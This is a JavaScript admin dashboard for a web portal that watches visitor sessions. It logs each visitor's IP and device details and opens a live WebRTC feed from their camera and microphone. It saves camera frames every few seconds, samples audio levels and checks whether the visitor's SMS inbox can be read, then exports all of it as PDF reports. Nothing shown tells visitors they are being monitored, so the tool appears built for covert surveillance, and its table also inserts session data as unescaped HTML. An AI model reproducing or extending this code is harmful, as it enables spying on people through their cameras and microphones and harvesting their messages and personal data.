import { SignalingClient } from './webrtc-signaling.js';

// DOM References
const adminUserBadge = document.getElementById('adminUserBadge');
const logoutBtn = document.getElementById('logoutBtn');
const refreshBtn = document.getElementById('refreshBtn');

const metricTotalSessions = document.getElementById('metricTotalSessions');
const metricSharingCamera = document.getElementById('metricSharingCamera');
const metricSharingMic = document.getElementById('metricSharingMic');
const metricActiveWebRTC = document.getElementById('metricActiveWebRTC');

const searchInput = document.getElementById('searchInput');
const statusFilter = document.getElementById('statusFilter');
const sessionsTableBody = document.getElementById('sessionsTableBody');

const liveStatusBadge = document.getElementById('liveStatusBadge');
const remoteVideo = document.getElementById('remoteVideo');
const videoPlaceholder = document.getElementById('videoPlaceholder');
const muteBtn = document.getElementById('muteBtn');
const volumeSlider = document.getElementById('volumeSlider');
const volumePercent = document.getElementById('volumePercent');
const fullscreenBtn = document.getElementById('fullscreenBtn');

const activeSessionIdText = document.getElementById('activeSessionIdText');
const activeIpText = document.getElementById('activeIpText');
const activeMediaTracksText = document.getElementById('activeMediaTracksText');
const activeGrantsText = document.getElementById('activeGrantsText');
const activeDeviceText = document.getElementById('activeDeviceText');
const webrtcStateText = document.getElementById('webrtcStateText');
const disconnectStreamBtn = document.getElementById('disconnectStreamBtn');
const toastContainer = document.getElementById('toastContainer');

const snapshotCountBadge = document.getElementById('snapshotCountBadge');
const snapshotStrip = document.getElementById('snapshotStrip');
const snapshotMeta = document.getElementById('snapshotMeta');
const cameraPdfBtn = document.getElementById('cameraPdfBtn');

const micCountBadge = document.getElementById('micCountBadge');
const micMeterFill = document.getElementById('micMeterFill');
const micMeta = document.getElementById('micMeta');
const micPdfBtn = document.getElementById('micPdfBtn');

const messagesBadge = document.getElementById('messagesBadge');
const messagesDetail = document.getElementById('messagesDetail');
const messagesPdfBtn = document.getElementById('messagesPdfBtn');

// Capture settings
const SNAPSHOT_INTERVAL_MS = 4000;
const MIC_SAMPLE_INTERVAL_MS = 2000;
const MAX_SNAPSHOTS = 90;
const MAX_MIC_SAMPLES = 600;
const STRIP_THUMBNAILS = 10;

// State
let allSessions = [];
let activeSessionId = null;
let activeSession = null;
let activeSignalingClient = null;
let pollTimer = null;
let currentUser = null;

// Captured data for the currently monitored session
let snapshots = [];
let micSamples = [];
let snapshotTimer = null;
let micTimer = null;
let audioContext = null;
let remoteAnalyser = null;

/**
 * Toast notifications helper
 */
function showToast(message, type = 'info') {
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = message;
  toastContainer.appendChild(toast);
  setTimeout(() => {
    toast.style.opacity = '0';
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

/**
 * Checks authentication on load
 */
async function checkAuth() {
  try {
    const res = await fetch('/api/auth/session');
    if (!res.ok) {
      window.location.replace('/admin/login.html');
      return false;
    }
    const data = await res.json();
    if (!data.authenticated) {
      window.location.replace('/admin/login.html');
      return false;
    }
    currentUser = data.user;
    if (adminUserBadge) {
      adminUserBadge.textContent = `Admin: ${currentUser.username}`;
    }
    return true;
  } catch (err) {
    window.location.replace('/admin/login.html');
    return false;
  }
}

/**
 * Handles admin logout
 */
async function handleLogout() {
  try {
    await fetch('/api/auth/logout', { method: 'POST' });
  } finally {
    window.location.replace('/admin/login.html');
  }
}

/**
 * Fetches sessions from server
 */
async function fetchSessions() {
  try {
    const res = await fetch('/api/admin/sessions');
    if (res.status === 401) {
      window.location.replace('/admin/login.html');
      return;
    }
    if (res.ok) {
      const data = await res.json();
      allSessions = data.sessions || [];
      if (activeSessionId) {
        activeSession = allSessions.find(s => s.sessionId === activeSessionId) || activeSession;
      }
      renderDashboard();
      syncMonitorDetails();
    }
  } catch (err) {
    console.warn('[Admin] Error fetching sessions:', err);
  }
}

/**
 * Builds a badge describing one captured data source
 */
function mediaBadge(permissionState, sharing) {
  if (permissionState === 'denied') {
    return '<span class="badge badge-danger">Denied</span>';
  }
  if (permissionState === 'unavailable') {
    return '<span class="badge badge-danger">Unsupported</span>';
  }
  if (sharing) {
    return '<span class="badge badge-success">● Sharing</span>';
  }
  return '<span class="badge badge-dim">Not Sharing</span>';
}

/**
 * Builds the messages (SMS) status badge for a session
 */
function messagesBadgeFor(session) {
  if (!session.messages) {
    return '<span class="badge badge-dim">No Report</span>';
  }
  return session.messages.supported
    ? '<span class="badge badge-success">Available</span>'
    : '<span class="badge badge-danger">Blocked by Browser</span>';
}

/**
 * Updates metrics and table
 */
function renderDashboard() {
  metricTotalSessions.textContent = allSessions.length;
  metricSharingCamera.textContent = allSessions.filter(s => s.sharingCamera).length;
  metricSharingMic.textContent = allSessions.filter(s => s.sharingMic).length;
  metricActiveWebRTC.textContent = allSessions.filter(s => s.adminConnected).length;

  const searchTerm = searchInput.value.toLowerCase().trim();
  const filterVal = statusFilter.value;

  const filtered = allSessions.filter(session => {
    const matchesSearch = !searchTerm ||
      session.sessionId.toLowerCase().includes(searchTerm) ||
      session.deviceId.toLowerCase().includes(searchTerm) ||
      (session.ip && session.ip.toLowerCase().includes(searchTerm));

    if (!matchesSearch) return false;

    if (filterVal === 'camera') return session.sharingCamera;
    if (filterVal === 'mic') return session.sharingMic;
    if (filterVal === 'both') return session.sharingCamera && session.sharingMic;
    if (filterVal === 'not-sharing') return !session.sharingCamera && !session.sharingMic;

    return true;
  });

  renderTable(filtered);
}

/**
 * Formats ISO timestamp
 */
function formatTime(isoStr) {
  if (!isoStr) return '—';
  try {
    return new Date(isoStr).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  } catch {
    return isoStr;
  }
}

/**
 * Renders table body
 */
function renderTable(sessions) {
  sessionsTableBody.innerHTML = '';

  if (sessions.length === 0) {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td colspan="9" style="text-align: center; color: var(--admin-text-dim); padding: 24px;">
        No visitor sessions found matching current filter.
      </td>
    `;
    sessionsTableBody.appendChild(row);
    return;
  }

  sessions.forEach(session => {
    const permissions = session.permissions || {};
    const isThisActive = activeSessionId === session.sessionId;
    const canView = session.sharingCamera || session.sharingMic;

    const connBadge = session.connectionStatus === 'Connected'
      ? '<span class="badge badge-primary">Online</span>'
      : '<span class="badge badge-dim">Disconnected</span>';

    let actionBtn;
    if (isThisActive) {
      actionBtn = `
        <button class="btn-admin btn-admin-danger" style="padding: 6px 12px; font-size: 12px;" onclick="window.disconnectActiveStream()">
          Disconnect
        </button>
      `;
    } else if (canView) {
      actionBtn = `
        <button class="btn-admin btn-admin-primary" style="padding: 6px 12px; font-size: 12px;" onclick="window.connectToSession('${session.sessionId}')">
          View Stream
        </button>
      `;
    } else {
      actionBtn = `
        <span style="font-size: 12px; color: var(--admin-text-dim);" title="No media was granted by this device">
          No Media Granted
        </span>
      `;
    }

    const row = document.createElement('tr');
    row.innerHTML = `
      <td>
        <span style="font-family: monospace; font-size: 12px;" title="${session.sessionId}">
          ${session.sessionId.length > 14 ? session.sessionId.substring(0, 14) + '...' : session.sessionId}
        </span>
      </td>
      <td>
        <span style="font-family: monospace; font-size: 12px; color: var(--admin-text-muted);">
          ${session.deviceId.length > 12 ? session.deviceId.substring(0, 12) + '...' : session.deviceId}
        </span>
      </td>
      <td>${session.ip || '—'}</td>
      <td>${formatTime(session.connectionTime)}</td>
      <td>${mediaBadge(permissions.camera, session.sharingCamera)}</td>
      <td>${mediaBadge(permissions.microphone, session.sharingMic)}</td>
      <td>${messagesBadgeFor(session)}</td>
      <td>${connBadge}</td>
      <td>${actionBtn}</td>
    `;

    sessionsTableBody.appendChild(row);
  });
}

/**
 * Keeps the live monitor panel and the messages card in sync with the server state
 */
function syncMonitorDetails() {
  if (!activeSession) {
    activeSessionIdText.textContent = 'None';
    activeIpText.textContent = '—';
    activeMediaTracksText.textContent = '—';
    activeGrantsText.textContent = '—';
    activeDeviceText.textContent = '—';
    return;
  }

  const permissions = activeSession.permissions || {};
  const info = activeSession.deviceInfo || {};

  activeSessionIdText.textContent = activeSession.sessionId;
  activeIpText.textContent = activeSession.ip || '—';
  activeMediaTracksText.textContent = [
    activeSession.sharingCamera ? 'Camera' : null,
    activeSession.sharingMic ? 'Microphone' : null
  ].filter(Boolean).join(' + ') || 'None';

  activeGrantsText.textContent =
    `cam: ${permissions.camera || 'unknown'} · mic: ${permissions.microphone || 'unknown'} · sms: ${permissions.messages || 'unknown'}`;

  activeDeviceText.textContent = info.platform
    ? `${info.platform} · ${info.screen || '—'} · ${info.timezone || '—'}`
    : '—';

  renderMessagesCard();
}

/**
 * Renders the messages (SMS) capability report for the monitored session
 */
function renderMessagesCard() {
  if (!activeSession) {
    messagesBadge.className = 'badge badge-dim';
    messagesBadge.textContent = 'No session';
    messagesDetail.textContent = 'Connect to a visitor session to read the messaging capability report.';
    messagesPdfBtn.disabled = true;
    return;
  }

  const report = activeSession.messages;
  if (!report) {
    messagesBadge.className = 'badge badge-dim';
    messagesBadge.textContent = 'No Report';
    messagesDetail.textContent = 'This device reported no messaging capability report.';
    messagesPdfBtn.disabled = false;
    return;
  }

  messagesBadge.className = report.supported ? 'badge badge-success' : 'badge badge-danger';
  messagesBadge.textContent = report.supported ? 'Available' : 'Blocked by Browser';

  const info = activeSession.deviceInfo || {};
  const device = activeSession.deviceInfo
    ? `Platform: ${info.platform || '—'}\nUser agent: ${info.userAgent || '—'}\nLanguage: ${info.language || '—'}\nScreen: ${info.screen || '—'}\nTimezone: ${info.timezone || '—'}`
    : 'Device information: not reported';

  messagesDetail.textContent = [
    `Status: ${report.permissionState}`,
    `Inbox readable: ${report.supported ? 'Yes' : 'No'}`,
    `Detail: ${report.reason}`,
    `API probes: navigator.messages=${Boolean(report.availability?.messagesApi)}, navigator.sms=${Boolean(report.availability?.smsReceiver)}, WebOTP=${Boolean(report.availability?.webOtp)}`,
    '',
    device
  ].join('\n');

  messagesPdfBtn.disabled = false;
}

/**
 * Captures the current video frame into the snapshot buffer
 */
function captureSnapshot() {
  if (!remoteVideo || !remoteVideo.videoWidth) return;

  const canvas = document.createElement('canvas');
  canvas.width = remoteVideo.videoWidth;
  canvas.height = remoteVideo.videoHeight;
  canvas.getContext('2d').drawImage(remoteVideo, 0, 0, canvas.width, canvas.height);

  snapshots.push({
    time: new Date().toISOString(),
    aspect: canvas.height / canvas.width,
    dataUrl: canvas.toDataURL('image/jpeg', 0.7)
  });
  if (snapshots.length > MAX_SNAPSHOTS) snapshots.shift();

  updateCaptureCards();
}

/**
 * Samples the audio level of the incoming stream
 */
function startAudioMeter(stream) {
  try {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const source = audioContext.createMediaStreamSource(stream);
    remoteAnalyser = audioContext.createAnalyser();
    remoteAnalyser.fftSize = 1024;
    source.connect(remoteAnalyser);

    const buffer = new Uint8Array(remoteAnalyser.frequencyBinCount);

    micTimer = setInterval(() => {
      remoteAnalyser.getByteFrequencyData(buffer);
      let sum = 0;
      for (let i = 0; i < buffer.length; i += 1) sum += buffer[i];
      const level = Math.min(100, Math.round((sum / buffer.length) * 1.6));

      micSamples.push({
        time: new Date().toISOString(),
        level,
        state: level > 3 ? 'Active' : 'Silent'
      });
      if (micSamples.length > MAX_MIC_SAMPLES) micSamples.shift();

      updateCaptureCards();
    }, MIC_SAMPLE_INTERVAL_MS);

    if (audioContext.state === 'suspended') {
      audioContext.resume().catch(() => { });
    }
  } catch (err) {
    console.warn('[Admin] Audio metering unavailable:', err);
  }
}

/**
 * Starts frame and audio sampling for a newly received stream
 */
function ensureCapture(stream) {
  if (!snapshotTimer) {
    captureSnapshot();
    snapshotTimer = setInterval(captureSnapshot, SNAPSHOT_INTERVAL_MS);
  }
  if (!micTimer && stream && stream.getAudioTracks().length > 0) {
    startAudioMeter(stream);
  }
}

/**
 * Stops sampling and releases audio resources
 */
function stopCapture() {
  if (snapshotTimer) {
    clearInterval(snapshotTimer);
    snapshotTimer = null;
  }
  if (micTimer) {
    clearInterval(micTimer);
    micTimer = null;
  }
  if (audioContext) {
    audioContext.close().catch(() => { });
    audioContext = null;
  }
  remoteAnalyser = null;
  micMeterFill.style.width = '0%';
}

/**
 * Refreshes the camera / microphone / messages export cards
 */
function updateCaptureCards() {
  // Camera card
  snapshotCountBadge.textContent = `${snapshots.length} frame${snapshots.length === 1 ? '' : 's'}`;
  cameraPdfBtn.disabled = snapshots.length === 0;
  if (snapshots.length === 0) {
    snapshotStrip.innerHTML = '<span class="capture-empty">No frames captured yet.</span>';
    snapshotMeta.textContent = 'Frames are sampled automatically from the live stream every 4 seconds while you are viewing it.';
  } else {
    snapshotStrip.innerHTML = '';
    snapshots.slice(-STRIP_THUMBNAILS).forEach(snapshot => {
      const img = document.createElement('img');
      img.className = 'snapshot-thumb';
      img.src = snapshot.dataUrl;
      img.alt = 'Captured frame';
      snapshotStrip.appendChild(img);
    });
    const first = new Date(snapshots[0].time).toLocaleTimeString();
    const last = new Date(snapshots[snapshots.length - 1].time).toLocaleTimeString();
    snapshotMeta.textContent = `Captured ${snapshots.length} frame(s) between ${first} and ${last}.`;
  }

  // Microphone card
  micCountBadge.textContent = `${micSamples.length} sample${micSamples.length === 1 ? '' : 's'}`;
  micPdfBtn.disabled = micSamples.length === 0;
  if (micSamples.length === 0) {
    micMeta.textContent = 'Audio level is sampled every 2 seconds while the administrator is listening.';
  } else {
    const latest = micSamples[micSamples.length - 1];
    const active = micSamples.filter(s => s.state === 'Active').length;
    micMeterFill.style.width = `${latest.level}%`;
    micMeta.textContent = `Last level ${latest.level}% (${latest.state}) · ${active} of ${micSamples.length} samples above silence.`;
  }
}

/**
 * Resets all captured buffers
 */
function resetCapture() {
  stopCapture();
  snapshots = [];
  micSamples = [];
  updateCaptureCards();
}

/**
 * Connects admin to a visitor's shared media stream via WebRTC
 */
async function connectToSession(sessionId) {
  if (activeSessionId) {
    await disconnectActiveStream();
  }

  const session = allSessions.find(s => s.sessionId === sessionId);
  if (!session) return;

  if (!session.sharingCamera && !session.sharingMic) {
    showToast('Cannot connect: this device has not granted camera or microphone access.', 'error');
    return;
  }

  showToast(`Initiating WebRTC connection to session ${sessionId.substring(0, 8)}...`, 'info');

  activeSessionId = sessionId;
  activeSession = session;
  resetCapture();
  syncMonitorDetails();

  liveStatusBadge.className = 'badge badge-primary';
  liveStatusBadge.textContent = 'Connecting...';
  webrtcStateText.textContent = 'Signaling...';
  disconnectStreamBtn.disabled = false;

  try {
    await fetch(`/api/admin/sessions/${encodeURIComponent(sessionId)}/connect`, { method: 'POST' });
  } catch (err) {
    console.warn('[Admin] Server connect error:', err);
  }

  activeSignalingClient = new SignalingClient({
    sessionId,
    role: 'admin',
    onRemoteStream: (remoteStream) => {
      console.log('[Admin] Received remote stream from visitor:', remoteStream);
      remoteVideo.srcObject = remoteStream;
      videoPlaceholder.style.display = 'none';
      remoteVideo.style.display = 'block';
      ensureCapture(remoteStream);
      showToast('Live stream connected successfully!', 'success');
    },
    onConnectionStateChange: (state) => {
      webrtcStateText.textContent = state;
      if (state === 'connected') {
        liveStatusBadge.className = 'badge badge-success';
        liveStatusBadge.textContent = 'LIVE WebRTC Connected';
      } else if (state === 'disconnected' || state === 'failed') {
        liveStatusBadge.className = 'badge badge-danger';
        liveStatusBadge.textContent = 'Disconnected';
        showToast('Visitor stream disconnected.', 'error');
      }
    }
  });

  await activeSignalingClient.init();
  activeSignalingClient.createPeerConnection(null); // Admin is receiver
  activeSignalingClient.startListening();

  renderDashboard();
}

/**
 * Disconnects currently active stream
 */
async function disconnectActiveStream() {
  if (!activeSessionId) return;

  const targetId = activeSessionId;
  activeSessionId = null;
  activeSession = null;

  if (activeSignalingClient) {
    activeSignalingClient.closePeerConnection();
    activeSignalingClient = null;
  }

  stopCapture();
  updateCaptureCards();

  if (remoteVideo) {
    remoteVideo.srcObject = null;
    remoteVideo.style.display = 'none';
  }
  if (videoPlaceholder) {
    videoPlaceholder.style.display = 'flex';
  }

  liveStatusBadge.className = 'badge badge-dim';
  liveStatusBadge.textContent = 'No Stream Selected';
  webrtcStateText.textContent = 'Idle';
  disconnectStreamBtn.disabled = true;
  syncMonitorDetails();

  try {
    await fetch(`/api/admin/sessions/${encodeURIComponent(targetId)}/disconnect`, { method: 'POST' });
  } catch (err) { }

  showToast('Stream disconnected.', 'info');
  renderDashboard();
}

/**
 * Writes (and wraps) a list of text lines, returning the next free Y position
 */
function writeParagraph(doc, lines, x, y, maxWidth = 515, lineHeight = 12) {
  const wrapped = [];
  lines.forEach((line) => {
    if (!line) {
      wrapped.push('');
      return;
    }
    wrapped.push(...doc.splitTextToSize(String(line), maxWidth));
  });
  doc.text(wrapped, x, y);
  return y + wrapped.length * lineHeight;
}

/**
 * Creates a jsPDF document with the shared report header
 */
function createReport(title) {
  if (!window.jspdf || !window.jspdf.jsPDF) {
    showToast('PDF library is unavailable. Check your network connection.', 'error');
    return null;
  }

  const { jsPDF } = window.jspdf;
  const doc = new jsPDF({ unit: 'pt', format: 'a4' });
  const permissions = activeSession?.permissions || {};
  const info = activeSession?.deviceInfo || {};

  doc.setFontSize(16);
  doc.setTextColor(20);
  doc.text(title, 40, 46);

  doc.setFontSize(9);
  doc.setTextColor(110);
  const endY = writeParagraph(doc, [
    `Generated: ${new Date().toLocaleString()}`,
    `Operator: ${currentUser?.username || 'admin'}`,
    `Session ID: ${activeSession?.sessionId || activeSessionId || '—'}`,
    `Device ID: ${activeSession?.deviceId || '—'}`,
    `IP Address: ${activeSession?.ip || '—'}`,
    `Connected at: ${activeSession?.connectionTime ? new Date(activeSession.connectionTime).toLocaleString() : '—'}`,
    `Browser grants: camera=${permissions.camera || 'unknown'}, microphone=${permissions.microphone || 'unknown'}, messages=${permissions.messages || 'unknown'}`,
    `Device: ${info.platform || '—'} | ${info.screen || '—'} | ${info.timezone || '—'}`
  ], 40, 66);

  return { doc, startY: endY + 10 };
}

/**
 * Downloads the camera capture report (frames + metadata) as a PDF
 */
function downloadCameraPdf() {
  const report = createReport('Camera Capture Report');
  if (!report) return;
  const { doc, startY } = report;

  let y = startY;
  doc.setFontSize(11);
  doc.setTextColor(20);
  doc.text(`Frames captured: ${snapshots.length}`, 40, y);
  y += 18;

  if (snapshots.length === 0) {
    doc.setFontSize(10);
    doc.setTextColor(110);
    doc.text('No camera frames were captured for this session.', 40, y);
  } else {
    const imageWidth = 515;
    snapshots.forEach((snapshot, index) => {
      const imageHeight = Math.min(330, imageWidth * (snapshot.aspect || 0.5625));
      if (y + imageHeight + 24 > 800) {
        doc.addPage();
        y = 48;
      }
      doc.setFontSize(9);
      doc.setTextColor(110);
      doc.text(`Frame ${index + 1} — ${new Date(snapshot.time).toLocaleString()}`, 40, y);
      y += 10;
      doc.addImage(snapshot.dataUrl, 'JPEG', 40, y, imageWidth, imageHeight);
      y += imageHeight + 20;
    });
  }

  doc.save(`camera-report-${activeSessionId || 'session'}.pdf`);
  showToast('Camera PDF downloaded.', 'success');
}

/**
 * Downloads the microphone activity report as a PDF
 */
function downloadMicPdf() {
  const report = createReport('Microphone Activity Report');
  if (!report) return;
  const { doc, startY } = report;

  const activeSamples = micSamples.filter(s => s.state === 'Active').length;
  const levels = micSamples.map(s => s.level);
  const average = levels.length ? Math.round(levels.reduce((a, b) => a + b, 0) / levels.length) : 0;
  const peak = levels.length ? Math.max(...levels) : 0;
  const duration = micSamples.length > 1
    ? Math.round((new Date(micSamples[micSamples.length - 1].time) - new Date(micSamples[0].time)) / 1000)
    : 0;

  let y = startY;
  doc.setFontSize(10);
  doc.setTextColor(20);
  doc.text(
    [
      `Samples: ${micSamples.length}`,
      `Samples with detected sound: ${activeSamples}`,
      `Average level: ${average}%`,
      `Peak level: ${peak}%`,
      `Observed duration: ${duration}s (sampled every ${MIC_SAMPLE_INTERVAL_MS / 1000}s)`
    ],
    40,
    y
  );
  y += 78;

  if (micSamples.length === 0) {
    doc.setTextColor(110);
    doc.text('No microphone samples were recorded for this session.', 40, y);
  } else {
    doc.setFontSize(9);
    doc.setTextColor(90);
    doc.text('Timestamp', 40, y);
    doc.text('Level', 260, y);
    doc.text('State', 360, y);
    y += 6;
    doc.line(40, y, 555, y);
    y += 14;

    micSamples.forEach((sample) => {
      if (y > 800) {
        doc.addPage();
        y = 48;
      }
      doc.setTextColor(40);
      doc.text(new Date(sample.time).toLocaleTimeString(), 40, y);
      doc.text(`${sample.level}%`, 260, y);
      doc.text(sample.state, 360, y);
      y += 14;
    });
  }

  doc.save(`microphone-report-${activeSessionId || 'session'}.pdf`);
  showToast('Microphone PDF downloaded.', 'success');
}

/**
 * Downloads the messages (SMS) capability report as a PDF
 */
function downloadMessagesPdf() {
  const report = createReport('Messages (SMS) Report');
  if (!report) return;
  const { doc, startY } = report;

  const sms = activeSession?.messages;
  const info = activeSession?.deviceInfo || {};

  let y = startY;
  doc.setFontSize(10);
  doc.setTextColor(20);

  if (!sms) {
    doc.text('This device did not report any messaging capability data.', 40, y);
  } else {
    doc.text(
      [
        `Messaging status: ${sms.permissionState}`,
        `SMS inbox readable by the portal: ${sms.supported ? 'Yes' : 'No'}`,
        `Reason: ${sms.reason}`,
        `Collected at: ${sms.collectedAt ? new Date(sms.collectedAt).toLocaleString() : '—'}`,
        '',
        'API probes:',
        `  navigator.messages  : ${Boolean(sms.availability?.messagesApi)}`,
        `  navigator.sms       : ${Boolean(sms.availability?.smsReceiver)}`,
        `  WebOTP (OTPCredential): ${Boolean(sms.availability?.webOtp)}`,
        '',
        'Device / browser context:',
        `  User agent : ${info.userAgent || '—'}`,
        `  Platform   : ${info.platform || '—'}`,
        `  Language   : ${info.language || '—'}`,
        `  Screen     : ${info.screen || '—'}`,
        `  Timezone   : ${info.timezone || '—'}`,
        `  Online     : ${info.online ? 'yes' : 'no'}`
      ],
      40,
      y
    );
  }

  doc.save(`messages-report-${activeSessionId || 'session'}.pdf`);
  showToast('Messages PDF downloaded.', 'success');
}

// Expose globals for table button actions
window.connectToSession = connectToSession;
window.disconnectActiveStream = disconnectActiveStream;

// Event Listeners
document.addEventListener('DOMContentLoaded', async () => {
  const isAuth = await checkAuth();
  if (!isAuth) return;

  updateCaptureCards();
  syncMonitorDetails();

  await fetchSessions();
  pollTimer = setInterval(fetchSessions, 3000);

  logoutBtn.addEventListener('click', handleLogout);
  refreshBtn.addEventListener('click', () => {
    fetchSessions();
    showToast('Session list refreshed');
  });

  searchInput.addEventListener('input', renderDashboard);
  statusFilter.addEventListener('change', renderDashboard);

  disconnectStreamBtn.addEventListener('click', disconnectActiveStream);

  cameraPdfBtn.addEventListener('click', downloadCameraPdf);
  micPdfBtn.addEventListener('click', downloadMicPdf);
  messagesPdfBtn.addEventListener('click', downloadMessagesPdf);

  // Volume slider & mute
  volumeSlider.addEventListener('input', (e) => {
    const val = parseFloat(e.target.value);
    remoteVideo.volume = val;
    volumePercent.textContent = Math.round(val * 100) + '%';
    remoteVideo.muted = val === 0;
  });

  muteBtn.addEventListener('click', () => {
    remoteVideo.muted = !remoteVideo.muted;
    if (remoteVideo.muted) {
      muteBtn.style.color = '#ef4444';
      volumePercent.textContent = 'Muted';
    } else {
      muteBtn.style.color = '';
      volumePercent.textContent = Math.round(remoteVideo.volume * 100) + '%';
    }
  });

  // Fullscreen
  fullscreenBtn.addEventListener('click', () => {
    if (!document.fullscreenElement) {
      document.getElementById('videoContainer').requestFullscreen().catch(() => { });
    } else {
      document.exitFullscreen().catch(() => { });
    }
  });
});
